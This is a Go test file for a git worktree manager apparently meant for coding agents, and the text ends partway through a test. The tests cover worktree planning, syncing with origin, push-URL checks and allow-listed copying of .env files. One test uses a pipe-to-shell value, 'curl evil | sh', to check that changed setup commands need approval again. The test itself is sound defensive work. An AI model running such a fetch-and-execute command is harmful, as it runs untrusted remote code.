package workspace

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"
)

// newRepo makes a primary repository with one commit on main under root.
func newRepo(t *testing.T, root, name string) Repo {
	t.Helper()
	dir := filepath.Join(root, name)
	run(t, root, "git", "init", "-q", "-b", "main", dir)
	run(t, dir, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init")
	return Repo{Name: name, Path: dir}
}

func run(t *testing.T, dir string, argv ...string) {
	t.Helper()
	cmd := exec.Command(argv[0], argv[1:]...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("%v: %v\n%s", argv, err, out)
	}
}

func TestScanSkipsWorktreesDir(t *testing.T) {
	root := t.TempDir()
	newRepo(t, root, "b")
	newRepo(t, root, "a")
	if err := os.MkdirAll(filepath.Join(root, "worktrees", "x", ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	repos, err := Scan(root, "worktrees")
	if err != nil {
		t.Fatal(err)
	}
	var names []string
	for _, r := range repos {
		names = append(names, r.Name)
	}
	if !reflect.DeepEqual(names, []string{"a", "b"}) {
		t.Fatalf("repos = %v", names)
	}
}

func TestPlanExecuteAndRemove(t *testing.T) {
	root := t.TempDir()
	a, b := newRepo(t, root, "a"), newRepo(t, root, "b")
	wtRoot := filepath.Join(root, "worktrees")

	plan, err := MakePlan(wtRoot, "feat/x", []Repo{a, b})
	if err != nil {
		t.Fatal(err)
	}
	if plan.Dir != filepath.Join(wtRoot, "feat-x-a-b") {
		t.Fatalf("dir = %s", plan.Dir)
	}
	for _, it := range plan.Items {
		if it.Mode != "new" || it.Base != "main" {
			t.Fatalf("item = %+v", it)
		}
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	if len(wts) != 2 {
		t.Fatalf("worktrees = %+v", wts)
	}
	if wt, ok := Inspect(wts[0].Path, []Repo{a, b}); !ok || wt.Branch != "feat/x" {
		t.Fatalf("inspect = %+v, %v", wt, ok)
	}

	// The same branch again is refused: it is checked out already.
	if _, err := MakePlan(filepath.Join(root, "other"), "feat/x", []Repo{a}); err == nil {
		t.Fatal("planned a branch that is checked out elsewhere")
	}

	if d := Dirty(wts); len(d) != 0 {
		t.Fatalf("dirty = %v", d)
	}
	if err := os.WriteFile(filepath.Join(wts[0].Path, "new.txt"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if d := Dirty(wts); !reflect.DeepEqual(d, []string{"a"}) {
		t.Fatalf("dirty = %v", d)
	}
	if u := Unpushed(wts); len(u) != 2 {
		// No remote at all: every commit counts as not pushed.
		t.Fatalf("unpushed = %v", u)
	}

	if err := Remove(plan.Dir, wts, false); err == nil {
		t.Fatal("removed a worktree with untracked work without force")
	}
	if err := Remove(plan.Dir, wts, true); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(plan.Dir); !os.IsNotExist(err) {
		t.Fatalf("group dir left behind: %v", err)
	}
	if !refExists(a.Path, "refs/heads/feat/x") {
		t.Fatal("removing the worktree deleted the branch")
	}
}

func TestFailedExecuteRemovesWhatItMade(t *testing.T) {
	root := t.TempDir()
	a, b := newRepo(t, root, "a"), newRepo(t, root, "b")
	plan, err := MakePlan(filepath.Join(root, "worktrees"), "feat", []Repo{a, b})
	if err != nil {
		t.Fatal(err)
	}
	// Make the second repository fail: its worktree path is taken.
	if err := os.MkdirAll(filepath.Join(plan.Items[1].Path, "x"), 0o755); err != nil {
		t.Fatal(err)
	}
	if _, err := plan.Execute(); err == nil {
		t.Fatal("execute succeeded")
	}
	if _, err := os.Stat(plan.Items[0].Path); !os.IsNotExist(err) {
		t.Fatalf("first worktree left behind: %v", err)
	}
	if refExists(a.Path, "refs/heads/feat") {
		t.Fatal("branch the failed plan created was left behind")
	}
}

func TestPlanDirHasRepoNames(t *testing.T) {
	root := t.TempDir()
	a := newRepo(t, root, "a")
	wtRoot := filepath.Join(root, "worktrees")
	for br, want := range map[string]string{"fix/sonar": "fix-sonar-a", "fix-a": "fix-a"} {
		plan, err := MakePlan(wtRoot, br, []Repo{a})
		if err != nil {
			t.Fatal(err)
		}
		if plan.Dir != filepath.Join(wtRoot, want) {
			t.Fatalf("%s: dir = %s, want %s", br, plan.Dir, want)
		}
	}
}

func TestExistingLeavesOutOpenTabs(t *testing.T) {
	root := t.TempDir()
	a := newRepo(t, root, "a")
	wtRoot := filepath.Join(root, "worktrees")
	for _, br := range []string{"one", "two"} {
		plan, err := MakePlan(wtRoot, br, []Repo{a})
		if err != nil {
			t.Fatal(err)
		}
		if _, err := plan.Execute(); err != nil {
			t.Fatal(err)
		}
	}
	groups := Existing(wtRoot, []Repo{a}, map[string]bool{filepath.Join(wtRoot, "one-a"): true})
	if len(groups) != 1 || groups[0].Name != "two" || groups[0].Worktrees[0].Branch != "two" {
		t.Fatalf("groups = %+v", groups)
	}
	// Detached, it is on no branch, and named by its folder.
	run(t, filepath.Join(wtRoot, "two-a"), "git", "checkout", "-q", "--detach")
	groups = Existing(wtRoot, []Repo{a}, map[string]bool{filepath.Join(wtRoot, "one-a"): true})
	if len(groups) != 1 || groups[0].Worktrees[0].Branch != "" || groups[0].Name != "two-a" {
		t.Fatalf("detached: groups = %+v", groups)
	}
}

func TestCopyIntoAndSetup(t *testing.T) {
	root := t.TempDir()
	a := newRepo(t, root, "a")
	must := func(err error) {
		t.Helper()
		if err != nil {
			t.Fatal(err)
		}
	}
	must(os.WriteFile(filepath.Join(a.Path, ".env"), []byte("A=1"), 0o600))
	must(os.WriteFile(filepath.Join(a.Path, ".env.local"), []byte("B=2"), 0o600))
	must(os.MkdirAll(filepath.Join(a.Path, "certs"), 0o755))
	must(os.WriteFile(filepath.Join(a.Path, "certs", "dev.pem"), []byte("pem"), 0o600))
	must(os.WriteFile(filepath.Join(a.Path, RepoConfigFile),
		[]byte(`copy = [".env*", "certs", "../escape", "missing"]`+"\nsetup = \"echo $PWD > where\"\n"), 0o644))

	plan, err := MakePlan(filepath.Join(root, "worktrees"), "feat", []Repo{a})
	must(err)
	wts, err := plan.Execute()
	must(err)
	// The branch's own file wins over the main checkout's.
	must(os.WriteFile(filepath.Join(wts[0].Path, ".env.local"), []byte("mine"), 0o600))

	allowed := filepath.Join(t.TempDir(), "allowed.json")
	if w := Prepare(wts, plan.SetupIn(), allowed, func(string) {}); len(w) != 1 || !strings.Contains(w[0], "not allowed") {
		t.Fatalf("a config not allowed should do nothing: %v", w)
	}
	if _, err := os.Stat(filepath.Join(wts[0].Path, ".env")); err == nil {
		t.Fatal("copied with the config not allowed")
	}
	c, _ := LoadRepoConfig(a.Path)
	if got := ToAllow(allowed, []string{a.Path}); len(got) != 1 {
		t.Fatalf("to allow = %v", got)
	}
	must(Allow(allowed, a.Path, c))
	if got := ToAllow(allowed, []string{a.Path}); len(got) != 0 {
		t.Fatalf("allowed, still asked: %v", got)
	}
	changed := c
	changed.Setup = "curl evil | sh"
	if Allowed(allowed, a.Path, changed) {
		t.Fatal("a changed config should be asked about again")
	}

	var steps []string
	warnings := Prepare(wts, plan.SetupIn(), allowed, func(s string) { steps = append(steps, s) })
	if len(warnings) != 1 || !strings.Contains(warnings[0], "../escape") {
		t.Fatalf("warnings = %v", warnings)
	}
	if len(steps) != 2 {
		t.Fatalf("steps = %v", steps)
	}
	for file, want := range map[string]string{".env": "A=1", ".env.local": "mine", "certs/dev.pem": "pem"} {
		got, err := os.ReadFile(filepath.Join(wts[0].Path, file))
		if err != nil || string(got) != want {
			t.Errorf("%s = %q, %v; want %q", file, got, err, want)
		}
	}
	if st, _ := os.Stat(filepath.Join(wts[0].Path, ".env")); st.Mode().Perm() != 0o600 {
		t.Errorf(".env mode = %v", st.Mode())
	}
	where, _ := os.ReadFile(filepath.Join(wts[0].Path, "where"))
	if got, _ := filepath.EvalSymlinks(strings.TrimSpace(string(where))); got != mustEval(t, wts[0].Path) {
		t.Errorf("setup ran in %q", where)
	}
}

func mustEval(t *testing.T, p string) string {
	t.Helper()
	r, err := filepath.EvalSymlinks(p)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func TestSetupFailureSaysWhy(t *testing.T) {
	err := RunSetup(t.TempDir(), "echo working; echo 'npm ERR! no package.json' >&2; exit 3")
	if err == nil || err.Error() != "npm ERR! no package.json" {
		t.Fatalf("err = %v", err)
	}
}

// A setup command that goes past its time is stopped with what it
// started: a child holding its output open does not keep nerdr waiting.
func TestSetupTimeoutStopsChildren(t *testing.T) {
	old := setupTimeout
	setupTimeout = 200 * time.Millisecond
	t.Cleanup(func() { setupTimeout = old })
	start := time.Now()
	err := RunSetup(t.TempDir(), "sleep 30 & sleep 30")
	if err == nil || !strings.Contains(err.Error(), "timed out") {
		t.Fatalf("err = %v", err)
	}
	if d := time.Since(start); d > 5*time.Second {
		t.Fatalf("waited %s for a setup timed out after %s", d, setupTimeout)
	}
}

func TestBranchStats(t *testing.T) {
	root := t.TempDir()
	a := newRepo(t, root, "a")
	plan, err := MakePlan(filepath.Join(root, "worktrees"), "feat", []Repo{a})
	if err != nil {
		t.Fatal(err)
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	w := wts[0]
	_ = os.WriteFile(filepath.Join(w.Path, "x.txt"), []byte("x\n"), 0o644)
	run(t, w.Path, "git", "add", "x.txt")
	run(t, w.Path, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "x")
	_ = os.WriteFile(filepath.Join(w.Path, "y.txt"), []byte("y\n"), 0o644)
	run(t, a.Path, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "main moves")
	run(t, a.Path, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "and again")

	s, err := BranchStats(w)
	if err != nil {
		t.Fatal(err)
	}
	if s.Base != "main" || s.Ahead != 1 || s.Behind != 2 {
		t.Fatalf("stats = %+v", s)
	}
	if !reflect.DeepEqual(s.Changed, []string{"x.txt", "y.txt"}) {
		t.Fatalf("changed = %v", s.Changed)
	}
}

func TestCommitsSinceLeavesOutMain(t *testing.T) {
	root := t.TempDir()
	a := newRepo(t, root, "a")
	plan, err := MakePlan(filepath.Join(root, "worktrees"), "feat", []Repo{a})
	if err != nil {
		t.Fatal(err)
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	w := wts[0]
	commit := func(dir, file string) {
		t.Helper()
		_ = os.WriteFile(filepath.Join(dir, file), []byte(file+"\n"), 0o644)
		run(t, dir, "git", "add", file)
		run(t, dir, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", file)
	}
	commit(w.Path, "x.txt")
	from := Head(w)
	commit(a.Path, "m1.txt")
	commit(a.Path, "m2.txt")
	// The agent rebases onto main, which rewrites x, and then commits y.
	run(t, w.Path, "git", "-c", "user.name=t", "-c", "user.email=t@t", "rebase", "-q", "main")
	commit(w.Path, "y.txt")

	subj, n := CommitsSince(w, from, 5)
	if n != 1 || !reflect.DeepEqual(subj, []string{"y.txt"}) {
		t.Fatalf("commits = %v, %d", subj, n)
	}
}

func TestScanAllLooksInRepoDirs(t *testing.T) {
	root, other := t.TempDir(), t.TempDir()
	newRepo(t, root, "a")
	newRepo(t, other, "b")
	one := newRepo(t, t.TempDir(), "c")
	repos, err := ScanAll(root, "worktrees", []string{other, one.Path, other})
	if err != nil {
		t.Fatal(err)
	}
	var names []string
	for _, r := range repos {
		names = append(names, r.Name)
	}
	if !reflect.DeepEqual(names, []string{"a", "b", "c"}) {
		t.Fatalf("repos = %v", names)
	}
}

// cloneWithOrigin makes a bare origin with one commit on main and a primary
// clone of it under root, and returns the clone and a function that pushes
// a new commit to origin from elsewhere, leaving the clone behind.
func cloneWithOrigin(t *testing.T, root, name string) (Repo, func() string) {
	t.Helper()
	origin := filepath.Join(root, "origins", name+".git")
	run(t, root, "git", "init", "-q", "--bare", "-b", "main", origin)
	other := filepath.Join(root, "others", name)
	run(t, root, "git", "clone", "-q", origin, other)
	commit := func() string {
		run(t, other, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "more")
		run(t, other, "git", "push", "-q", "origin", "HEAD:main")
		return revParse(t, other, "HEAD")
	}
	commit()
	dir := filepath.Join(root, name)
	run(t, root, "git", "clone", "-q", origin, dir)
	return Repo{Name: name, Path: dir}, commit
}

func revParse(t *testing.T, dir, ref string) string {
	t.Helper()
	out, err := exec.Command("git", "-C", dir, "rev-parse", ref).Output()
	if err != nil {
		t.Fatalf("rev-parse %s: %v", ref, err)
	}
	return strings.TrimSpace(string(out))
}

func TestSyncStartsFromOriginAndPullsMain(t *testing.T) {
	root := t.TempDir()
	a, push := cloneWithOrigin(t, root, "a")
	b, pushB := cloneWithOrigin(t, root, "b")
	newest, newestB := push(), pushB()
	// b's main checkout is on another branch, so its main is moved without
	// a checkout.
	run(t, b.Path, "git", "switch", "-q", "-c", "elsewhere")

	plan, err := MakePlan(filepath.Join(root, "worktrees"), "feat", []Repo{a, b})
	if err != nil {
		t.Fatal(err)
	}
	warnings, err := plan.Sync()
	if err != nil || len(warnings) != 0 {
		t.Fatalf("sync: %v, %v", warnings, err)
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	if got := revParse(t, wts[0].Path, "HEAD"); got != newest {
		t.Fatalf("a's worktree starts at %s, not origin's %s", got, newest)
	}
	if got := revParse(t, wts[1].Path, "HEAD"); got != newestB {
		t.Fatalf("b's worktree starts at %s, not origin's %s", got, newestB)
	}
	if got := revParse(t, a.Path, "HEAD"); got != newest {
		t.Fatalf("a's main checkout was not pulled: %s", got)
	}
	if got := revParse(t, b.Path, "main"); got != newestB {
		t.Fatalf("b's local main was not brought up to date: %s", got)
	}
}

func TestSyncLeavesLocalCommitsOnMain(t *testing.T) {
	root := t.TempDir()
	a, push := cloneWithOrigin(t, root, "a")
	newest := push()
	run(t, a.Path, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "mine")
	mine := revParse(t, a.Path, "HEAD")

	plan, err := MakePlan(filepath.Join(root, "worktrees"), "feat", []Repo{a})
	if err != nil {
		t.Fatal(err)
	}
	warnings, err := plan.Sync()
	if err != nil || len(warnings) != 1 {
		t.Fatalf("sync: %v, %v", warnings, err)
	}
	if got := revParse(t, a.Path, "main"); got != mine {
		t.Fatalf("local main with a commit of its own was moved to %s", got)
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	if got := revParse(t, wts[0].Path, "HEAD"); got != newest {
		t.Fatalf("worktree starts at %s, not origin's %s", got, newest)
	}
}

func TestSyncRefusesWhenFetchFails(t *testing.T) {
	root := t.TempDir()
	a, _ := cloneWithOrigin(t, root, "a")
	run(t, a.Path, "git", "remote", "set-url", "origin", filepath.Join(root, "gone.git"))

	plan, err := MakePlan(filepath.Join(root, "worktrees"), "feat", []Repo{a})
	if err != nil {
		t.Fatal(err)
	}
	_, err = plan.Sync()
	var fe *FetchError
	if !errors.As(err, &fe) {
		t.Fatalf("sync went on without being able to fetch, or said so without a FetchError: %v", err)
	}

	// Asked to, it starts from origin's main as it was last fetched.
	plan.Unfetched = true
	warnings, err := plan.Sync()
	if err != nil {
		t.Fatal(err)
	}
	if len(warnings) != 1 || !strings.Contains(warnings[0], "last fetched") {
		t.Fatalf("starting from what was last fetched says so: %q", warnings)
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	if got, want := revParse(t, wts[0].Path, "HEAD"), revParse(t, a.Path, "origin/main"); got != want {
		t.Fatalf("worktree starts at %s, not origin/main as last fetched, %s", got, want)
	}
}

// TestGitReasonSaysWhyNotWhatToCheck covers a fetch over ssh that could
// not use the key: git's last lines are advice that fits any failure to
// connect, and ssh's line before them is the one that says what this was.
func TestGitReasonSaysWhyNotWhatToCheck(t *testing.T) {
	stderr := "git@github.com: Permission denied (publickey).\n" +
		"fatal: Could not read from remote repository.\n\n" +
		"Please make sure you have the correct access rights\n" +
		"and the repository exists.\n"
	got := gitReason(stderr)
	if got != "git@github.com: Permission denied (publickey)." {
		t.Fatalf("gitReason = %q", got)
	}
	if h := fetchHint(got); !strings.Contains(h, "ssh-add") {
		t.Fatalf("a key ssh could not use points to ssh-add: %q", h)
	}
	if got := gitReason("warning: x\nfatal: bad revision 'nope'\n"); got != "fatal: bad revision 'nope'" {
		t.Fatalf("otherwise the last line: %q", got)
	}
}

// TestPlanAsksAboutOriginsBranch covers a branch name origin already has:
// merged into main, with work of its own, or deleted on origin with only
// the stale local copy of it left. The first two are "remote", for the
// user to choose; the last is new, and the stale copy is dropped.
func TestPlanAsksAboutOriginsBranch(t *testing.T) {
	root := t.TempDir()
	a := newRepo(t, root, "a")
	origin := filepath.Join(root, "origin.git")
	run(t, root, "git", "init", "-q", "--bare", "-b", "main", origin)
	g := func(args ...string) {
		t.Helper()
		run(t, a.Path, append([]string{"git", "-c", "user.name=t", "-c", "user.email=t@t"}, args...)...)
	}
	g("remote", "add", "origin", origin)
	for _, b := range []string{"merged", "open", "gone"} {
		g("checkout", "-q", "-b", b, "main")
		g("commit", "-q", "--allow-empty", "-m", b)
		g("push", "-q", "origin", b)
	}
	g("checkout", "-q", "main")
	g("merge", "-q", "--ff-only", "merged")
	g("push", "-q", "origin", "main")
	g("fetch", "-q", "origin")
	g("push", "-q", "origin", "--delete", "gone")
	g("update-ref", "refs/remotes/origin/gone", "gone") // the stale copy a fetch without --prune leaves
	g("branch", "-q", "-D", "merged", "open", "gone")
	wtRoot := filepath.Join(root, "worktrees")

	for _, c := range []struct {
		branch, mode string
		ahead        int
		merged       bool
	}{
		{"merged", "remote", 0, true},
		{"open", "remote", 1, false},
		{"gone", "new", 0, false},
	} {
		plan, err := MakePlan(wtRoot, c.branch, []Repo{a})
		if err != nil {
			t.Fatal(err)
		}
		it := plan.Items[0]
		if it.Mode != c.mode || it.Base != "origin/main" {
			t.Fatalf("%s: mode %s base %s", c.branch, it.Mode, it.Base)
		}
		if c.mode == "remote" && (it.Ahead != c.ahead || it.Merged() != c.merged) {
			t.Fatalf("%s: ahead %d merged %v", c.branch, it.Ahead, it.Merged())
		}
	}
	if refExists(a.Path, "refs/remotes/origin/gone") {
		t.Fatal("the stale copy of a branch deleted on origin was kept")
	}

	// Choosing a new branch leaves origin's alone and starts from main.
	plan, _ := MakePlan(wtRoot, "open", []Repo{a})
	wts, err := plan.FromBase().Execute()
	if err != nil {
		t.Fatal(err)
	}
	head, _ := git(wts[0].Path, "rev-parse", "HEAD")
	main, _ := git(a.Path, "rev-parse", "origin/main")
	if head != main {
		t.Fatalf("new branch starts at %s, want origin/main %s", head, main)
	}
	if up, err := git(wts[0].Path, "rev-parse", "--abbrev-ref", "@{upstream}"); err == nil {
		t.Fatalf("new branch tracks %s", up)
	}
}

// TestPlanAsksAboutLocalBranch covers a branch name there is a local
// branch of already: one merged long ago and left behind, and one with
// work of its own. Both are "local", for the user to choose; the merged
// one can be replaced by a new branch from origin's main, which origin has
// moved on from since, the other cannot.
func TestPlanAsksAboutLocalBranch(t *testing.T) {
	root := t.TempDir()
	a, commit := cloneWithOrigin(t, root, "a")
	g := func(args ...string) {
		t.Helper()
		run(t, a.Path, append([]string{"git", "-c", "user.name=t", "-c", "user.email=t@t"}, args...)...)
	}
	g("branch", "-q", "--track", "old", "origin/main")
	g("checkout", "-q", "-b", "mine", "main")
	g("commit", "-q", "--allow-empty", "-m", "mine")
	g("checkout", "-q", "main")
	commit()
	main := commit() // only on origin: MakePlan fetches it
	wtRoot := filepath.Join(root, "worktrees")

	for _, c := range []struct {
		branch       string
		ahead        int
		merged, anew bool
	}{
		{"old", 0, true, true},
		{"mine", 1, false, false},
	} {
		plan, err := MakePlan(wtRoot, c.branch, []Repo{a})
		if err != nil {
			t.Fatal(err)
		}
		it := plan.Items[0]
		if it.Mode != "local" || it.Base != "origin/main" || it.Ahead != c.ahead || it.Behind != 2 ||
			it.Merged() != c.merged || plan.CanStartAnew() != c.anew {
			t.Fatalf("%s: %+v", c.branch, it)
		}
		if len(plan.ExistingItems()) != 1 {
			t.Fatalf("%s: not among the existing", c.branch)
		}
	}

	// Work that is not merged is never replaced: starting anew keeps it.
	plan, _ := MakePlan(wtRoot, "mine", []Repo{a})
	if it := plan.FromBase().Items[0]; it.Mode != "local" || it.Replaces != "" {
		t.Fatalf("unmerged local branch made new: %+v", it)
	}

	// A commit landing on the merged branch after it was found merged
	// stops it being replaced, and the branch is left as it was.
	plan, _ = MakePlan(wtRoot, "old", []Repo{a})
	g("update-ref", "refs/heads/old", "refs/heads/mine")
	anew := plan.FromBase()
	if _, err := anew.Sync(); err != nil {
		t.Fatal(err)
	}
	if _, err := anew.Execute(); err == nil {
		t.Fatal("replaced a branch that moved since it was found merged")
	}
	if revParse(t, a.Path, "old") != revParse(t, a.Path, "mine") {
		t.Fatal("the moved branch was not left as it was")
	}
	g("update-ref", "refs/heads/old", plan.Items[0].Tip)

	// The merged one is replaced by a new branch at origin's main, which
	// tracks nothing.
	anew = plan.FromBase()
	if it := anew.Items[0]; it.Mode != "new" || it.Replaces != plan.Items[0].Tip {
		t.Fatalf("merged local branch not made new: %+v", it)
	}
	if !strings.Contains(strings.Join(anew.Describe(), "\n"), "in place of the merged local one") {
		t.Fatalf("describe: %q", anew.Describe())
	}
	if _, err := anew.Sync(); err != nil {
		t.Fatal(err)
	}
	wts, err := anew.Execute()
	if err != nil {
		t.Fatal(err)
	}
	if head := revParse(t, wts[0].Path, "HEAD"); head != main {
		t.Fatalf("new branch at %s, want origin/main %s", head, main)
	}
	if up, err := git(wts[0].Path, "rev-parse", "--abbrev-ref", "@{upstream}"); err == nil {
		t.Fatalf("new branch tracks %s", up)
	}
}

// A local branch whose pull request was merged (squashed, so its commits
// are not in main) is replaced only when the pull request's head has all
// it has: a commit made after the merge keeps it from being taken over.
func TestMergedPRWithLaterCommits(t *testing.T) {
	root := t.TempDir()
	a, commit := cloneWithOrigin(t, root, "a")
	g := func(args ...string) {
		t.Helper()
		run(t, a.Path, append([]string{"git", "-c", "user.name=t", "-c", "user.email=t@t"}, args...)...)
	}
	g("checkout", "-q", "-b", "fix", "main")
	g("commit", "-q", "--allow-empty", "-m", "the PR's")
	prHead := revParse(t, a.Path, "fix")
	g("commit", "-q", "--allow-empty", "-m", "after the merge")
	g("checkout", "-q", "main")
	commit()
	wtRoot := filepath.Join(root, "worktrees")

	plan, err := MakePlan(wtRoot, "fix", []Repo{a})
	if err != nil {
		t.Fatal(err)
	}
	it := &plan.Items[0]
	it.SetPR(7, "MERGED", prHead)
	if it.PRHasTip || it.AfterPR != 1 || it.Merged() || plan.CanStartAnew() {
		t.Fatalf("a commit after the merged PR was not seen: %+v", *it)
	}
	if fb := plan.FromBase().Items[0]; fb.Mode != "local" || fb.Replaces != "" {
		t.Fatalf("branch with work after its PR made new: %+v", fb)
	}
	it.SetPR(7, "MERGED", "0123456789012345678901234567890123456789")
	if it.PRHasTip || it.Merged() {
		t.Fatalf("a PR head git does not have was taken to hold the branch: %+v", *it)
	}
	it.SetPR(7, "MERGED", it.Tip)
	if !it.PRHasTip || !it.Merged() || !plan.CanStartAnew() {
		t.Fatalf("branch at its merged PR's head not taken as merged: %+v", *it)
	}
}

// A replaced local branch that a later repository's failure undoes is put
// back where it was, not deleted.
func TestExecuteUndoesReplacedBranch(t *testing.T) {
	root := t.TempDir()
	a, _ := cloneWithOrigin(t, root, "a")
	b, _ := cloneWithOrigin(t, root, "b")
	run(t, a.Path, "git", "branch", "-q", "old", "main")
	plan, err := MakePlan(filepath.Join(root, "worktrees"), "old", []Repo{a, b})
	if err != nil {
		t.Fatal(err)
	}
	tip := plan.Items[0].Tip
	run(t, a.Path, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "on main")
	anew := plan.FromBase()
	anew.Items[0].Base = "main" // ahead of where old was
	anew.Items[1].Base = "no-such-ref"
	if _, err := anew.Execute(); err == nil {
		t.Fatal("expected b to fail")
	}
	if got := revParse(t, a.Path, "old"); got != tip {
		t.Fatalf("old at %s after undo, want %s", got, tip)
	}
}

func TestPushKeepsToTheRecordedOrigin(t *testing.T) {
	root := t.TempDir()
	a := newRepo(t, root, "a")
	origin, elsewhere := filepath.Join(root, "origin.git"), filepath.Join(root, "elsewhere.git")
	run(t, root, "git", "init", "-q", "--bare", origin)
	run(t, root, "git", "init", "-q", "--bare", elsewhere)
	run(t, a.Path, "git", "remote", "add", "origin", origin)
	run(t, a.Path, "git", "push", "-q", "origin", "main")

	plan, err := MakePlan(filepath.Join(root, "worktrees"), "feat/x", []Repo{a})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := plan.Sync(); err != nil {
		t.Fatal(err)
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	w := wts[0]
	if w.Origin != origin {
		t.Fatalf("origin recorded as %q, want %q", w.Origin, origin)
	}

	// The agent points origin somewhere else: nerdr will not push there.
	run(t, a.Path, "git", "remote", "set-url", "origin", elsewhere)
	if err := Push(w); err == nil || !strings.Contains(err.Error(), elsewhere) {
		t.Fatalf("push to a changed origin: %v", err)
	}
	run(t, a.Path, "git", "remote", "set-url", "--push", "origin", elsewhere)
	run(t, a.Path, "git", "remote", "set-url", "origin", origin)
	if err := Push(w); err == nil {
		t.Fatal("pushed to a changed push URL")
	}
	run(t, a.Path, "git", "remote", "set-url", "--delete", "--push", "origin", elsewhere)
	if err := Push(w); err != nil {
		t.Fatalf("push to the recorded origin: %v", err)
	}

	// A second push URL beside the recorded one would get the branch too.
	run(t, a.Path, "git", "remote", "set-url", "--add", "--push", "origin", origin)
	run(t, a.Path, "git", "remote", "set-url", "--add", "--push", "origin", elsewhere)
	if err := Push(w); err == nil || !strings.Contains(err.Error(), elsewhere) {
		t.Fatalf("push with a push URL added: %v", err)
	}
	if out, _ := git(elsewhere, "branch", "--list", "feat/x"); strings.TrimSpace(out) != "" {
		t.Fatal("the branch reached the added push URL")
	}

	// Push URLs there when the tab was opened are all kept to.
	w.Pushes = OriginURLs(w.Path)
	if err := Push(w); err != nil {
		t.Fatalf("push to the recorded push URLs: %v", err)
	}

	// A URL with a space in it is one URL, not two that two others could
	// pass for.
	spaced := filepath.Join(root, "allowed repo.git")
	run(t, a.Path, "git", "remote", "set-url", "--delete", "--push", "origin", ".*")
	run(t, a.Path, "git", "remote", "set-url", "--add", "--push", "origin", spaced)
	if got := OriginURLs(w.Path); len(got) != 1 || got[0] != spaced {
		t.Fatalf("push URLs %q, want [%q]", got, spaced)
	}
	w.Pushes = []string{spaced}
	run(t, a.Path, "git", "remote", "set-url", "--delete", "--push", "origin", ".*")
	run(t, a.Path, "git", "remote", "set-url", "--add", "--push", "origin", filepath.Join(root, "allowed"))
	run(t, a.Path, "git", "remote", "set-url", "--add", "--push", "origin", "repo.git")
	if err := CheckOrigin(w); err == nil {
		t.Fatal("two push URLs passed for one with a space in it")
	}
}

// TestCopyStaysInTheRepository: a symlink in the main checkout does not let
// copy reach files out of it.
func TestCopyStaysInTheRepository(t *testing.T) {
	src, dst, secret := t.TempDir(), t.TempDir(), t.TempDir()
	if err := os.WriteFile(filepath.Join(secret, "id_ed25519"), []byte("key"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(secret, filepath.Join(src, "link")); err != nil {
		t.Fatal(err)
	}
	err := CopyInto(src, dst, []string{"link/*"})
	if err == nil || !strings.Contains(err.Error(), "symlink out of the repository") {
		t.Fatalf("err = %v", err)
	}
	if _, err := os.Stat(filepath.Join(dst, "link", "id_ed25519")); err == nil {
		t.Fatal("copied a file from out of the repository")
	}
}

// A pull request from a fork is fetched from origin's refs/pull/N/head
// into a branch of its own, a tab is made on it as on any local branch,
// and nerdr will not push it to origin.
func TestForkPullRequest(t *testing.T) {
	root := t.TempDir()
	a := newRepo(t, root, "a")
	origin := filepath.Join(root, "origin.git")
	run(t, root, "git", "init", "-q", "--bare", origin)
	run(t, a.Path, "git", "remote", "add", "origin", origin)
	run(t, a.Path, "git", "push", "-q", "origin", "main")
	// The fork's commit, as GitHub keeps it on origin.
	run(t, a.Path, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "from the fork")
	run(t, a.Path, "git", "push", "-q", "origin", "HEAD:refs/pull/7/head")
	run(t, a.Path, "git", "reset", "-q", "--hard", "HEAD~1")

	b := ForkBranch(7, "main")
	if b != "pr-7-main" {
		t.Fatalf("branch %q", b)
	}
	if err := FetchForkPR(a.Path, 7, b); err != nil {
		t.Fatal(err)
	}
	if got := ForkPRNumber(a.Path, b); got != 7 {
		t.Fatalf("ForkPRNumber = %d", got)
	}
	if ForkPRNumber(a.Path, "main") != 0 {
		t.Fatal("main is not a fork's pull request")
	}
	plan, err := MakePlan(filepath.Join(root, "worktrees"), b, []Repo{a})
	if err != nil || plan.Items[0].Mode != "local" {
		t.Fatalf("plan: %+v %v", plan.Items, err)
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	if got := revParse(t, wts[0].Path, "HEAD"); got != revParse(t, origin, "refs/pull/7/head") {
		t.Fatal("the worktree is not at the pull request's head")
	}
	if err := Push(wts[0]); err == nil || !strings.Contains(err.Error(), "fork") {
		t.Fatalf("pushed a fork's pull request: %v", err)
	}
	if refExists(origin, "refs/heads/"+b) {
		t.Fatal("the branch reached origin")
	}
}

// TestBranchOnlyOnOriginIsCheckedOut covers a branch pushed to origin
// since the repository last fetched: no ref of it here at all, yet it is
// origin's branch to continue, not a new one to start from main.
func TestBranchOnlyOnOriginIsCheckedOut(t *testing.T) {
	root := t.TempDir()
